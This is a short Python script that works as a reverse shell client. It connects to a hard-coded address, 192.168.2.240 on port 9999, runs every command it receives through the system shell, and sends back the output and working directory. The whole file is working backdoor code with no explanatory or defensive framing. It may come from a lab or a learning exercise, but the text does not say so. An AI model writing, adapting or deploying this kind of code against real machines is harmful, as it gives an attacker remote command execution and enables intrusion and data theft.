import os
import socket
import subprocess

host='192.168.2.240'
port= 9999

client = socket.socket()
client.connect((host,port))

while True:
    data = client.recv(1024)
    if (data[:2].decode("utf-8") == "cd"):
        os.chdir(data[3:].decode("utf-8"))
    if(len(data) > 0):
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_bytes,"utf-8")
        client.send(str.encode('\n' + output_string + str(os.getcwd()) + '>'))
